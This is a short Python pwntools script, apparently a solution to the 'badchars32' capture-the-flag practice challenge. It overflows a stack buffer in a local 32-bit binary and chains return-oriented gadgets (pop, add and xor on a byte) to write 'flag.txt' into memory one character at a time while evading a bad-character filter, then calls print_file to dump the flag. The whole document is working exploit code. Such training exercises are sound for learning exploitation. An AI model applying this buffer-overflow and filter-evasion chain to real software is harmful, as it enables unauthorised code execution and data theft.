import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./badchars32')
e = pwn.ELF('./badchars32')
libbadchars32 = pwn.ELF('./libbadchars32.so')

'''
for k, v in e.sym.items():
    print(k, hex(v))
pwn.pause()
'''

main_addr = pwn.p32(e.sym['main'])
print_file_addr = pwn.p32(e.plt['print_file'])
bss_addr = e.bss()

# ROPgadget --binary badchars32
add_bl__ebp__addr = pwn.p32(0x8048543)       # add bl, (%ebp) ; ret
pop_ebx_addr = pwn.p32(0x0804839d)           # pop ebx ; ret
pop_ebp_addr = pwn.p32(0x080485bb)           # pop ebp ; ret
xor_bl__ebp__addr = pwn.p32(0x08048547)      # xor bl, (%ebp) ; ret

#pwn.gdb.attach(p)

# 在payload中把限制字符异或掉，防止被过滤
i = 0
for ch in 'flag.txt':
    payload = b'A' * 0x28 + b'B' * 4 + pop_ebx_addr + pwn.p32(ord(ch) ^ 2) + pop_ebp_addr + pwn.p32(bss_addr + i) + add_bl__ebp__addr + pop_ebx_addr + pwn.p32(2) + xor_bl__ebp__addr + main_addr
    p.sendlineafter(b'> ', payload)
    i += 1

#pwn.gdb.attach(p)

payload = b'A' * 0x28 + b'B' * 4 + print_file_addr + b'R' * 4 + pwn.p32(bss_addr)
p.sendlineafter(b'> ', payload)
p.recv()